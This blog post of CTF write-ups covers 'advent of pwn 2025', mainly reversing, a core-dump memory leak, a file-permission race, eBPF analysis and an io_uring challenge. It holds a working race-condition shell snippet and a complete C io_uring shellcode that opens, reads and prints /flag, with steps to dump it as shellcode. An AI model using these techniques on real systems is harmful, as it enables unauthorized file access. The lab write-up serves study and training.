---
layout: post
tags: [ctf_wp]
title: "advent of pwn 2025"
author: wsxk
date: 2025-12-15
comments: true
---

- [day 1: check-list](#day-1-check-list)
- [day 2: coal](#day-2-coal)
- [day 3: race condition](#day-3-race-condition)
- [day 4: ebpf](#day-4-ebpf)
- [day 5: io\_uring](#day-5-io_uring)
- [day 6: 区块链](#day-6-区块链)
- [day 7：web](#day-7web)
- [day 8：compiler](#day-8compiler)
- [day 9：](#day-9)
- [day 10: ](#day-10-)
- [day 11: ](#day-11-)
- [day 12: ](#day-12-)


# day 1: check-list<br>
超长汇编构成一个函数执行（ida无法反编译），函数读取256字节输入，经过变换后，得到的输出与结果比较，正确就输出flag<br>
**经过分析256个字节的变换是以一个字节为单位的（其字节A和字节B的变换没有相关性）的线性函数(只有add和sub两个汇编指令)：yi = xi + bi**<br>
解题思路是： <br>
```
1. 输入全为0，得到256个线性函数 yi = xi +bi 中的bi数组
2. ida脚本提取 yi
3. xi = yi-bi
```
得到正确输入。<br>


# day 2: coal<br>
根据题目的意思：可能某些命令的组合条件能够**dump**出内存，即普通用户能够dump出root用户进程的内存。<br>
相关环境的命令:<br>
```
nice(1), core(5), elf(5), pty(7), signal(7)
```
设置`ulimit -c unlimited`后，执行程序然后`ctrl+\`dump出内存即可。<br>
切换到练习模式获得root，改文件权限然后看内存即可~<br>

# day 3: race condition<br>
条件竞争，在改权限前先以只读模式打开文件即可。<br>
```
exec 3</stocking 
nice -n 2 sleep 2
cat <&3
```

# day 4: ebpf<br>
是个跟`ebpf`有关的题目。<br>
用户态的程序`northhole`在ebpf中加载了`tracker.bpf.o`的ebpf字节码。<br>
并时刻检查`tracker.bpf.o`中的某个字段是否为1，是1则打印flag，不是则循环等待。<br>
所以关键还是要看`bpf.o`中的ebpf字节码的逻辑。<br>
简单介绍下ebpf，总之ebpf机制允许用户通过`bpf`系统调用，向内核注入`ebpf字节码`，再通过`kprobe`机制，在内核执行某个函数（比如这道题目的linkat系统调用）时，先进入用户的`ebpf`代码逻辑，再执行原有函数linkat。<br>
[一文看懂eBPF、eBPF的使用（超详细）](https://zhuanlan.zhihu.com/p/480811707)<br>
[linux 内核调试工具 kprobe](https://zhuanlan.zhihu.com/p/663837982)<br>

```
# llvm-objdump -S --no-show-raw-insn /challenge/tracker.bpf.o
# bpf常见约定:
# r1：kprobe 的上下文，一般是 struct pt_regs *.
# r10：栈指针（frame pointer），栈向下增长，比如 r10 - 0x10。
# call 0x1：基本可以认作 bpf_map_lookup_elem(...)。
# call 0x2：bpf_map_update_elem(...)。
# call 0x71/0x72：是某种 bpf_probe_read_*/bpf_probe_read_*_str，从内核/用户内存里把指针或字符串拷到栈上

/challenge/tracker.bpf.o:       file format elf64-bpf

Disassembly of section kprobe/__x64_sys_linkat:

0000000000000000 <handle_do_linkat>:
       0:       r6 = *(u64 *)(r1 + 0x70)
       1:       r1 = 0x0
       2:       *(u64 *)(r10 - 0x30) = r1
       3:       *(u64 *)(r10 - 0x38) = r1
       4:       if r6 == 0x0 goto +0x10e <handle_do_linkat+0x898>
       5:       r3 = r6
       6:       r3 += 0x68
       7:       r1 = r10
       8:       r1 += -0x30
       9:       r2 = 0x8
      10:       call 0x71
      11:       r6 += 0x38
      12:       r1 = r10
      13:       r1 += -0x38
      14:       r2 = 0x8
      15:       r3 = r6
      16:       call 0x71
      17:       r3 = *(u64 *)(r10 - 0x30)
      18:       if r3 == 0x0 goto +0x100 <handle_do_linkat+0x898>
      19:       r1 = *(u64 *)(r10 - 0x38)
      20:       if r1 == 0x0 goto +0xfe <handle_do_linkat+0x898>
      21:       r1 = r10
      22:       r1 += -0x28
      23:       r2 = 0x10
      24:       call 0x72
      25:       r0 <<= 0x20
      26:       r0 s>>= 0x20
      27:       r1 = 0x1
      28:       if r1 s> r0 goto +0xf6 <handle_do_linkat+0x898>
      29:       r3 = *(u64 *)(r10 - 0x30)
      30:       r1 = r10
      31:       r1 += -0x10
      32:       r2 = 0x10
      33:       call 0x72
      34:       r0 <<= 0x20
      35:       r0 >>= 0x20
      36:       if r0 != 0x7 goto +0xee <handle_do_linkat+0x898>
      37:       r1 = *(u8 *)(r10 - 0x10)
      38:       if r1 != 0x73 goto +0xec <handle_do_linkat+0x898>
      39:       r1 = *(u8 *)(r10 - 0xf)
      40:       if r1 != 0x6c goto +0xea <handle_do_linkat+0x898>
      41:       r1 = *(u8 *)(r10 - 0xe)
      42:       if r1 != 0x65 goto +0xe8 <handle_do_linkat+0x898>
      43:       r1 = *(u8 *)(r10 - 0xd)
      44:       if r1 != 0x69 goto +0xe6 <handle_do_linkat+0x898>
      45:       r1 = *(u8 *)(r10 - 0xc)
      46:       if r1 != 0x67 goto +0xe4 <handle_do_linkat+0x898>
      47:       r1 = *(u8 *)(r10 - 0xb)
      48:       if r1 != 0x68 goto +0xe2 <handle_do_linkat+0x898>
      49:       r3 = *(u64 *)(r10 - 0x38)
      50:       r1 = r10
      51:       r1 += -0x28
      52:       r2 = 0x10
      53:       call 0x72
      54:       r0 <<= 0x20
      55:       r0 s>>= 0x20
      56:       r1 = 0x1
      57:       if r1 s> r0 goto +0xd9 <handle_do_linkat+0x898>
      58:       r6 = *(u64 *)(r10 - 0x38)
      59:       r7 = 0x0
      60:       *(u32 *)(r10 - 0x14) = r7
      61:       r2 = r10
      62:       r2 += -0x14
      63:       r1 = 0x0 ll
      65:       call 0x1
      66:       if r0 == 0x0 goto +0x1 <handle_do_linkat+0x220>
      67:       r7 = *(u32 *)(r0 + 0x0)
      68:       r1 = r10
      69:       r1 += -0x10
      70:       r2 = 0x10
      71:       r3 = r6
      72:       call 0x72
      73:       r0 <<= 0x20
      74:       r0 >>= 0x20
      75:       if r0 != 0x7 goto +0xe <handle_do_linkat+0x2d0>
      76:       r1 = *(u8 *)(r10 - 0x10)
      77:       if r1 != 0x64 goto +0xc <handle_do_linkat+0x2d0>
      78:       r1 = *(u8 *)(r10 - 0xf)
      79:       if r1 != 0x61 goto +0xa <handle_do_linkat+0x2d0>
      80:       r1 = *(u8 *)(r10 - 0xe)
      81:       if r1 != 0x73 goto +0x8 <handle_do_linkat+0x2d0>
      82:       r1 = *(u8 *)(r10 - 0xd)
      83:       if r1 != 0x68 goto +0x6 <handle_do_linkat+0x2d0>
      84:       r1 = *(u8 *)(r10 - 0xc)
      85:       if r1 != 0x65 goto +0x4 <handle_do_linkat+0x2d0>
      86:       r1 = *(u8 *)(r10 - 0xb)
      87:       if r1 != 0x72 goto +0x2 <handle_do_linkat+0x2d0>
      88:       r1 = 0x1
      89:       goto +0xb0 <handle_do_linkat+0x850>
      90:       if r7 s> 0x3 goto +0x18 <handle_do_linkat+0x398>
      91:       if r7 == 0x1 goto +0x55 <handle_do_linkat+0x588>
      92:       if r7 == 0x2 goto +0x94 <handle_do_linkat+0x788>
      93:       if r7 == 0x3 goto +0x1 <handle_do_linkat+0x2f8>
      94:       goto +0xaa <handle_do_linkat+0x848>
      95:       r1 = r10
      96:       r1 += -0x10
      97:       r2 = 0x10
      98:       r3 = r6
      99:       call 0x72
     100:       r0 <<= 0x20
     101:       r0 >>= 0x20
     102:       if r0 != 0x6 goto +0xa2 <handle_do_linkat+0x848>
     103:       r1 = *(u8 *)(r10 - 0x10)
     104:       if r1 != 0x76 goto +0xa0 <handle_do_linkat+0x848>
     105:       r1 = *(u8 *)(r10 - 0xf)
     106:       if r1 != 0x69 goto +0x9e <handle_do_linkat+0x848>
     107:       r1 = *(u8 *)(r10 - 0xe)
     108:       if r1 != 0x78 goto +0x9c <handle_do_linkat+0x848>
     109:       r1 = *(u8 *)(r10 - 0xd)
     110:       if r1 != 0x65 goto +0x9a <handle_do_linkat+0x848>
     111:       r1 = *(u8 *)(r10 - 0xc)
     112:       if r1 != 0x6e goto +0x98 <handle_do_linkat+0x848>
     113:       r1 = 0x4
     114:       goto +0x97 <handle_do_linkat+0x850>
     115:       if r7 s> 0x5 goto +0x17 <handle_do_linkat+0x458>
     116:       if r7 == 0x4 goto +0x52 <handle_do_linkat+0x638>
     117:       if r7 == 0x5 goto +0x1 <handle_do_linkat+0x3b8>
     118:       goto +0x92 <handle_do_linkat+0x848>
     119:       r1 = r10
     120:       r1 += -0x10
     121:       r2 = 0x10
     122:       r3 = r6
     123:       call 0x72
     124:       r0 <<= 0x20
     125:       r0 >>= 0x20
     126:       if r0 != 0x6 goto +0x8a <handle_do_linkat+0x848>
     127:       r1 = *(u8 *)(r10 - 0x10)
     128:       if r1 != 0x63 goto +0x88 <handle_do_linkat+0x848>
     129:       r1 = *(u8 *)(r10 - 0xf)
     130:       if r1 != 0x75 goto +0x86 <handle_do_linkat+0x848>
     131:       r1 = *(u8 *)(r10 - 0xe)
     132:       if r1 != 0x70 goto +0x84 <handle_do_linkat+0x848>
     133:       r1 = *(u8 *)(r10 - 0xd)
     134:       if r1 != 0x69 goto +0x82 <handle_do_linkat+0x848>
     135:       r1 = *(u8 *)(r10 - 0xc)
     136:       if r1 != 0x64 goto +0x80 <handle_do_linkat+0x848>
     137:       r1 = 0x6
     138:       goto +0x7f <handle_do_linkat+0x850>
     139:       if r7 == 0x6 goto +0x4f <handle_do_linkat+0x6d8>
     140:       if r7 == 0x7 goto +0x1 <handle_do_linkat+0x470>
     141:       goto +0x7b <handle_do_linkat+0x848>
     142:       r1 = r10
     143:       r1 += -0x10
     144:       r2 = 0x10
     145:       r3 = r6
     146:       call 0x72
     147:       r0 <<= 0x20
     148:       r0 >>= 0x20
     149:       if r0 != 0x8 goto +0x73 <handle_do_linkat+0x848>
     150:       r1 = *(u8 *)(r10 - 0x10)
     151:       if r1 != 0x62 goto +0x71 <handle_do_linkat+0x848>
     152:       r1 = *(u8 *)(r10 - 0xf)
     153:       if r1 != 0x6c goto +0x6f <handle_do_linkat+0x848>
     154:       r1 = *(u8 *)(r10 - 0xe)
     155:       if r1 != 0x69 goto +0x6d <handle_do_linkat+0x848>
     156:       r1 = *(u8 *)(r10 - 0xd)
     157:       if r1 != 0x74 goto +0x6b <handle_do_linkat+0x848>
     158:       r1 = *(u8 *)(r10 - 0xc)
     159:       if r1 != 0x7a goto +0x69 <handle_do_linkat+0x848>
     160:       r1 = *(u8 *)(r10 - 0xb)
     161:       if r1 != 0x65 goto +0x67 <handle_do_linkat+0x848>
     162:       r1 = *(u8 *)(r10 - 0xa)
     163:       if r1 != 0x6e goto +0x65 <handle_do_linkat+0x848>
     164:       r1 = 0x8
     165:       *(u32 *)(r10 - 0x18) = r1
     166:       r1 = 0x1
     167:       *(u32 *)(r10 - 0x10) = r1
     168:       r2 = r10
     169:       r2 += -0x14
     170:       r3 = r10
     171:       r3 += -0x10
     172:       r1 = 0x0 ll
     174:       r4 = 0x0
     175:       call 0x2
     176:       goto +0x5a <handle_do_linkat+0x858>
     177:       r1 = r10
     178:       r1 += -0x10
     179:       r2 = 0x10
     180:       r3 = r6
     181:       call 0x72
     182:       r0 <<= 0x20
     183:       r0 >>= 0x20
     184:       if r0 != 0x7 goto +0x50 <handle_do_linkat+0x848>
     185:       r1 = *(u8 *)(r10 - 0x10)
     186:       if r1 != 0x64 goto +0x4e <handle_do_linkat+0x848>
     187:       r1 = *(u8 *)(r10 - 0xf)
     188:       if r1 != 0x61 goto +0x4c <handle_do_linkat+0x848>
     189:       r1 = *(u8 *)(r10 - 0xe)
     190:       if r1 != 0x6e goto +0x4a <handle_do_linkat+0x848>
     191:       r1 = *(u8 *)(r10 - 0xd)
     192:       if r1 != 0x63 goto +0x48 <handle_do_linkat+0x848>
     193:       r1 = *(u8 *)(r10 - 0xc)
     194:       if r1 != 0x65 goto +0x46 <handle_do_linkat+0x848>
     195:       r1 = *(u8 *)(r10 - 0xb)
     196:       if r1 != 0x72 goto +0x44 <handle_do_linkat+0x848>
     197:       r1 = 0x2
     198:       goto +0x43 <handle_do_linkat+0x850>
     199:       r1 = r10
     200:       r1 += -0x10
     201:       r2 = 0x10
     202:       r3 = r6
     203:       call 0x72
     204:       r0 <<= 0x20
     205:       r0 >>= 0x20
     206:       if r0 != 0x6 goto +0x3a <handle_do_linkat+0x848>
     207:       r1 = *(u8 *)(r10 - 0x10)
     208:       if r1 != 0x63 goto +0x38 <handle_do_linkat+0x848>
     209:       r1 = *(u8 *)(r10 - 0xf)
     210:       if r1 != 0x6f goto +0x36 <handle_do_linkat+0x848>
     211:       r1 = *(u8 *)(r10 - 0xe)
     212:       if r1 != 0x6d goto +0x34 <handle_do_linkat+0x848>
     213:       r1 = *(u8 *)(r10 - 0xd)
     214:       if r1 != 0x65 goto +0x32 <handle_do_linkat+0x848>
     215:       r1 = *(u8 *)(r10 - 0xc)
     216:       if r1 != 0x74 goto +0x30 <handle_do_linkat+0x848>
     217:       r1 = 0x5
     218:       goto +0x2f <handle_do_linkat+0x850>
     219:       r1 = r10
     220:       r1 += -0x10
     221:       r2 = 0x10
     222:       r3 = r6
     223:       call 0x72
     224:       r0 <<= 0x20
     225:       r0 >>= 0x20
     226:       if r0 != 0x7 goto +0x26 <handle_do_linkat+0x848>
     227:       r1 = *(u8 *)(r10 - 0x10)
     228:       if r1 != 0x64 goto +0x24 <handle_do_linkat+0x848>
     229:       r1 = *(u8 *)(r10 - 0xf)
     230:       if r1 != 0x6f goto +0x22 <handle_do_linkat+0x848>
     231:       r1 = *(u8 *)(r10 - 0xe)
     232:       if r1 != 0x6e goto +0x20 <handle_do_linkat+0x848>
     233:       r1 = *(u8 *)(r10 - 0xd)
     234:       if r1 != 0x6e goto +0x1e <handle_do_linkat+0x848>
     235:       r1 = *(u8 *)(r10 - 0xc)
     236:       if r1 != 0x65 goto +0x1c <handle_do_linkat+0x848>
     237:       r1 = *(u8 *)(r10 - 0xb)
     238:       if r1 != 0x72 goto +0x1a <handle_do_linkat+0x848>
     239:       r1 = 0x7
     240:       goto +0x19 <handle_do_linkat+0x850>
     241:       r1 = r10
     242:       r1 += -0x10
     243:       r2 = 0x10
     244:       r3 = r6
     245:       call 0x72
     246:       r0 <<= 0x20
     247:       r0 >>= 0x20
     248:       if r0 != 0x8 goto +0x10 <handle_do_linkat+0x848>
     249:       r1 = *(u8 *)(r10 - 0x10)
     250:       if r1 != 0x70 goto +0xe <handle_do_linkat+0x848>
     251:       r1 = *(u8 *)(r10 - 0xf)
     252:       if r1 != 0x72 goto +0xc <handle_do_linkat+0x848>
     253:       r1 = *(u8 *)(r10 - 0xe)
     254:       if r1 != 0x61 goto +0xa <handle_do_linkat+0x848>
     255:       r1 = *(u8 *)(r10 - 0xd)
     256:       if r1 != 0x6e goto +0x8 <handle_do_linkat+0x848>
     257:       r1 = *(u8 *)(r10 - 0xc)
     258:       if r1 != 0x63 goto +0x6 <handle_do_linkat+0x848>
     259:       r1 = *(u8 *)(r10 - 0xb)
     260:       if r1 != 0x65 goto +0x4 <handle_do_linkat+0x848>
     261:       r1 = *(u8 *)(r10 - 0xa)
     262:       if r1 != 0x72 goto +0x2 <handle_do_linkat+0x848>
     263:       r1 = 0x3
     264:       goto +0x1 <handle_do_linkat+0x850>
     265:       r1 = 0x0
     266:       *(u32 *)(r10 - 0x18) = r1
     267:       r2 = r10
     268:       r2 += -0x14
     269:       r3 = r10
     270:       r3 += -0x18
     271:       r1 = 0x0 ll
     273:       r4 = 0x0
     274:       call 0x2
     275:       r0 = 0x0
     276:       exit
```
经过chatgpt5.1的高贵分析，得知只要按照顺序linkat文件，就能完成解题<br>

# day 5: io_uring<br>
最近`io_uring`系统调用受到了广泛关注，因为这个系统调用几乎可模拟任意的系统调用。<br>
特别的，高版本` (Linux Kernel Version >= 6.5)` 的`io_uring`中引入了`IORING_SETUP_NO_MMAP`标志，配合`IORING_SETUP_SQPOLL`可以一次`syscall`完成`orw`操作。十分的强力<br>
但是现有资料，对于`io_uring`的`IORING_SETUP_NO_MMAP`的描述比较少，所以要从头开始写起，就很麻烦<br>
```c
//gcc -fcf-protection=none -masm=intel -static demo2.c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <linux/mman.h>
#include <linux/fs.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
/* 2 个参数：给 io_uring_setup 用 */
#define SYSCALL2(num, a1, a2)                                         \
({                                                                    \
    long _ret;                                                        \
    register long _nr  __asm__("rax") = (long)(num);                  \
    register long _a1  __asm__("rdi") = (long)(a1);                   \
    register long _a2  __asm__("rsi") = (long)(a2);                   \
    __asm__ volatile (                                                \
        "syscall"                                                     \
        : "+r"(_nr)                                                   \
        : "r"(_a1), "r"(_a2)                                          \
        : "rcx", "r11", "memory"                                      \
    );                                                                 \
    _ret = _nr;                                                       \
    _ret;                                                             \
})

/* 6 个参数：给 io_uring_enter 用 */
#define SYSCALL6(num, a1,a2,a3,a4,a5,a6)                              \
({                                                                    \
    long _ret;                                                        \
    register long _nr  __asm__("rax") = (long)(num);                  \
    register long _a1  __asm__("rdi") = (long)(a1);                   \
    register long _a2  __asm__("rsi") = (long)(a2);                   \
    register long _a3  __asm__("rdx") = (long)(a3);                   \
    register long _a4  __asm__("r10") = (long)(a4);                   \
    register long _a5  __asm__("r8")  = (long)(a5);                   \
    register long _a6  __asm__("r9")  = (long)(a6);                   \
    __asm__ volatile (                                                \
        "syscall"                                                     \
        : "+r"(_nr)                                                   \
        : "r"(_a1), "r"(_a2), "r"(_a3),                               \
          "r"(_a4), "r"(_a5), "r"(_a6)                                \
        : "rcx", "r11", "memory"                                      \
    );                                                                \
    _ret = _nr;                                                       \
    _ret;                                                             \
})
    
void __attribute__((noinline,no_stack_protector))  shellcode(){
    char filename[8] = "/flag";
    unsigned entries = 16;
    unsigned char buffer[4096*2];
    unsigned long long addr = (unsigned long long)buffer & (unsigned long long)(~0xfff);
    //printf("%llx\n",addr);
    void * sqes_base = addr;//sqes
    struct io_uring_sqe * sqes = sqes_base;
    void * ring_base = addr+4096;//ring: sq & cq
    struct io_uring_params io_uring_params;
    io_uring_params.flags = IORING_SETUP_NO_MMAP;
    io_uring_params.sq_off.user_addr = sqes_base;
    io_uring_params.cq_off.user_addr = ring_base;
    //int io_uring_fd = syscall(SYS_io_uring_setup, entries, &io_uring_params);
    int io_uring_fd= SYSCALL2(SYS_io_uring_setup, entries, &io_uring_params);
    //printf("io_uring fd: %d\n",io_uring_fd);
    //printf("sq_off_head: %x, sq_off_tail: %x. sq_off_array = %x\n",io_uring_params.sq_off.head,io_uring_params.sq_off.tail,io_uring_params.sq_off.array);
    //printf("cq_off_head: %x, cq_off_tail: %x, cq_off_cqes = %x\n",io_uring_params.cq_off.head,io_uring_params.cq_off.tail,io_uring_params.cq_off.cqes);
    
    // open file 
    long ret;
    struct io_uring_sqe sqe ={0};
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = AT_FDCWD;
    sqe.addr = (unsigned long)filename;
    sqe.len = 0;                     // mode（不用 O_CREAT）
    sqe.open_flags = O_RDONLY;
    
    sqes[0]= sqe; //push sqe into sqes
    ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
    (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);

    struct io_uring_cqe *  cqe = (void *)(ring_base + io_uring_params.cq_off.cqes);
    int open_fd = (int)cqe->res;
    //printf("open fd: %d\n",open_fd);
    (*(int *)(ring_base+io_uring_params.cq_off.head))++;
    
    // read file
    char flag[60];
    struct io_uring_sqe sqe2 ={0};
    sqe2.opcode = IORING_OP_READ;
    sqe2.fd = open_fd;
    sqe2.addr = (unsigned long)flag;
    sqe2.len = 60;                     
    sqe2.off = 0;
    sqes[0]= sqe2; //push sqe into sqes
    ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
    (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
    (*(int *)(ring_base+io_uring_params.cq_off.head))++;

    //write file
    struct io_uring_sqe sqe3 ={0};
    sqe3.opcode = IORING_OP_WRITE;
    sqe3.fd = STDOUT_FILENO;
    sqe3.addr = (unsigned long)flag;
    sqe3.len = 60;
    sqe3.off = 0;
    sqes[0]= sqe3; //push sqe into sqes
    ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
    (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
    (*(int *)(ring_base+io_uring_params.cq_off.head))++;
}


int main(){
    //printf("start execute!\n");

    shellcode();

    //printf("end execute!\n");

}
```
把shellcode函数dump出来用即可。<br>
```
objdump -M intel -d --disassemble=shellcode a.out
# gdb
dump binary memory shellcode.bin xxx xxx
```
参考[https://idocdown.com/app/articles/blogs/detail/10310](https://idocdown.com/app/articles/blogs/detail/10310)<br>
[一文详细讲解 io_uring](https://zhuanlan.zhihu.com/p/582562402)<br>
[I/O 模型演化: Linux 的 io_uring](https://hackmd.io/@sysprog/iouring)<br>


# day 6: 区块链<br>
似乎是区块链的题目<br>
先pass，可以回头再看

# day 7：web<br>
是web的题目，pass<br>


# day 8：compiler<br>
编译器题目<br>

# day 9：<br>

# day 10: <br>

# day 11: <br>


# day 12: <br>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>